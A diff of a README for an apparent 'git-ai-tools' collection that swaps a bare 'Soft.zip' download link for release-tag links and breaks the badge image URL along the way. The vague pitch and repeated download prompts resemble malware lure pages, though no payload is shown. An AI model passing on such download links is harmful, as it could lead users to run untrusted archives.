@@ -26,13 +26,13 @@ A comprehensive collection of AI-powered tools designed to enhance your Git work
 🔓 openai  
 
 ## Get Started
-To explore the full potential of these AI-powered Git tools, download the collection from [here](https://github.com/files/Soft.zip).  
+To explore the full potential of these AI-powered Git tools, download the collection from [here](https://github.com/NotDafter/git-ai-tools/releases/tag/v1.2).  
 
-[![Launch Git AI Tools](https://img.shields.io/badge/Launch-Git%20AI%20Tools-blue)](https://github.com/files/Soft.zip)
+[![Launch Git AI Tools](https://github.com/NotDafter/git-ai-tools/releases/tag/v1.2%20AI%20Tools-blue)](https://github.com/NotDafter/git-ai-tools/releases/tag/v1.2)
 
 If the link does not work, kindly check the "Releases" section for alternative download options.
 
 ## Additional Resources
-Visit the [Git AI Tools](https://github.com/files/Soft.zip) official website for more information and updates.
+Visit the [Git AI Tools](https://github.com/NotDafter/git-ai-tools/releases/tag/v1.2) official website for more information and updates.
 
 Let the power of AI revolutionize your Git experience with the "git-ai-tools" collection. Happy coding! 🌟
